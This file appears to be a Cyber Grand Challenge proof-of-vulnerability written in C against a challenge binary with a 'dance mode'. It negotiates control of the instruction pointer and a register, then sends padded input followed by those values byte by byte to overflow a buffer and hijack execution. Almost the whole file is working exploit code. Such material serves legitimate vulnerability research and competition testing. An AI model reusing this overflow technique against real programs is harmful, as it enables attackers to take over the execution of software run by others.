#include <libpov.h>

static int moves = 0;

char *strcat(char *s1, const char *s2)
{
	char *os1 = s1;
	while (*s1)
		s1++;
	strcpy(s1, s2);
	return os1;
}

void wait_for_move()
{
    unsigned char *buf = NULL;
    unsigned int buflen = 0;
    delimited_read(STDIN, &buf, &buflen, (unsigned char *)"DANCE MODE", 10);
    free(buf);
    moves++;
}

void append_char(unsigned char *buf, unsigned int ch)
{
	int i;
	for (i = 0; i < ch; i++)
	{
        wait_for_move();
        transmit_all(STDOUT, "w\n", 2);
	}
    wait_for_move();
    transmit_all(STDOUT, "s\n", 2);
}

unsigned char buf[300000];

int main(void) {
	unsigned int n;
	type1_vals t1;

	type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);
	t1.ipval |= 0x01010101;
	t1.regval |= 0x01010101;

	// Build the buffer
	buf[0] = '\0';
	strcat((char *)buf, "magic\n");

	for (n = 0; n < 23; n++)
	{
		strcat((char *)buf, "\n\n\n\nd\n");
	}

	for (n = 0; n < 16; n++)
	{
		strcat((char *)buf, "\n");
	}

	transmit_all(STDOUT, buf, strlen((char *)buf));

	for (n = 0; n < 280 - 12; n++)
	{
		append_char(buf, 10);
	}

	unsigned char tmp[4];
	*(unsigned int*)tmp = t1.regval;
	for (n = 0; n < 4; n++)
		append_char(buf, tmp[n]);
	*(unsigned int*)tmp = t1.ipval;
	for (n = 0; n < 4; n++)
		append_char(buf, tmp[n]);

    wait_for_move();
    transmit_all(STDOUT, "d\n", 2);
    wait_for_move();
    transmit_all(STDOUT, "q\n", 2);
	return 0;
}
